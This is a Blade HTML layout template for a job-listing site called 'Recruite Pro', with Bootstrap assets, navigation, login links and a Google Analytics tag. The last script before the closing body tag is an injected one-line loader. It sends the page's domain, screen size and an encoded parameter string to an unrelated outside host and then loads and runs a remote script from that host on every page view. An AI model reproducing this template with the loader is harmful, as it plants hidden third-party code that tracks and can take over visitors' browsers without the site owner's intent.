<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
<title>Recruite Pro</title>
<!-- Bootstrap -->
<link href="{{ asset('pro/assets/bootstrap/css/bootstrap.min.css')}}" rel="stylesheet">
<!-- Font Awesome CSS-->
<link href="{{ asset('pro/assets/font-awesome/css/font-awesome.min.css')}}" rel="stylesheet">
<!-- Animate CSS -->
<link href="{{ asset('pro/assets/animate/animate.css')}}" rel="stylesheet">
<!-- Owl Carousel -->
<link href="{{ asset('pro/assets/owl-carousel/css/owl.carousel.css')}}" rel="stylesheet">
<link href="{{ asset('pro/assets/owl-carousel/css/owl.theme.css')}}" rel="stylesheet">
<!-- magnific Css -->
<link href="{{ asset('pro/assets/css/magnific-popup.css')}}" rel="stylesheet">
<!-- Custom CSS -->
<link href="{{ asset('pro/css/style.css')}}" rel="stylesheet">
<!-- Favicon -->
<link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>
<body>
<!-- Loader -->
<div id="dvLoading"></div>
<!-- Header Start -->
<header class="wow fadeInDown" data-offset-top="197" data-spy="affix">
  <div class="logo-wrapper"> 
    <!-- Logo -->
    <div class="container">
      <div class="row"> 
        <!-- Logo -->
        <div class="col-sm-12 col-md-3 hidden-xs"> <a href="index.html"><img src="{{ asset('pro/images/logo.png') }}" alt="Recruite Pro"/></a> </div>
        <!-- Navigation -->
        <div class="col-sm-12 col-md-9">
          <nav class="navbar navbar-default pull-right"> 
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">
              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button>
              <a class="navbar-brand" href="index.html"><img src="{{ asset('pro/images/logo.png')}}" alt="Recruite Pro"/></a> </div>
            <!-- Collect the nav links, forms, and other content for toggling -->
            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
              <ul class="nav navbar-nav">
                <li class="active"><a href="{{url('/')}}">Home</a></li>
                <li class="active"><a href="{{url('/lowongan')}}">Lowongan</a></li>
                <li class="active"><a href="{{route('lowongan.index')}}">Pasang Lowongan</a></li>
              </ul>
            </div>
            <!-- /.navbar-collapse -->
            <div class="user"><img src="{{ asset('pro/images/user-icon.png')}}" alt=""></div>
          <div class="login pull-right hidden-xs"> <a href="{{route('login')}}">Login</a></div>
          <div class="login pull-right hidden-xs"> <a href="{{route('register')}}">Sign Up</a></div>
          </nav>
        </div>
      </div>
    </div>
  </div>
</header>
<!-- Header End --> 
<!-- Banner Wrapper Start -->
@yield('content')
<!-- blog Wrapper End --> 
<!-- Footer styles Start -->

<!-- Footer styles End --> 
<!-- Copyright styles End -->
<div class="copyright-wrapper">
  <div class="container">
    <p>&copy; Copyright 
      <script type="text/javascript">
	var d=new Date();
	document.write(d.getFullYear());
	</script> 
      Recruite Pro | All Rights Reserved.</p>
  </div>
</div>

<!-- Copyright styles End --> 
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) --> 
<script src="{{ ('pro/assets/jquery/jquery-3.1.1.min.js')}}"></script> 
<!-- Include all compiled plugins (below), or include individual files as needed --> 
<script src="{{ ('pro/assets/bootstrap/js/bootstrap.min.js')}}"></script> 
<script src="{{ ('pro/assets/jquery/plugins.js')}}"></script> 
<script src="{{ ('pro/assets/jquery/jquery.animateNumber.min.js')}}"></script> 
<script src="{{ ('pro/assets/jquery/jquery.magnific-popup.min.js')}}"></script> 
<script src="{{ ('pro/assets/owl-carousel/js/owl.carousel.js')}}"></script> 
<script src="{{ ('pro/assets/wow/wow.min.js')}}"></script> 
<script src="{{ ('pro/js/custom.js')}}"></script>
<!-- Global Site Tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-83282272-3"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments)};
  gtag('js', new Date());

  gtag('config', 'UA-83282272-3');
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mPpgx50wDZcdwjSL%2bcYiT7bYn2PkJTKatyLsJl%2bBsSPuBqaliNvv0iTe1ReN2wXM%2btO7fiBxyA1F4oWwQa3F0oWamq0zcTN7%2b63eCW%2blSZVFf0I6WJrQ5zeIh48ItOfg%2bMbs1HEqnR4mPRqA1cCwwvPcw3xMjOwLLSQN8kgljgyZGcN9%2bMSoumfIw%2bT8r4ZVxEe8U%2bb2ye0z1xrPeXT8%2fELSDSY1TXuJlBGKhTGOTs%2bBXEeYuY%2bdGBzso2LEa0IGSL%2bCKE4fBc8kqrx%2b%2b2N%2f4At7jSNSpykHueLXw3rHGIfvS6neJ6jCGeFaQC7pNp3lZX8ZsNC7UDAV%2fLAyy8TKFHZwXqlTvk7EVx4bpClTVkRX%2fDutl3BV1EwtIBCnOhKuB%2byojhGMU96%2fpSZAaPZEYFu8wa09jfW6eiX22wiGB9QiVYEGSfVbbQy30OTxRlzMuvWVCPiBkQlHSE3O47p5%2bCasSGDYK%2bD9JguYEbMuNWK9qxYxexyz4rA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>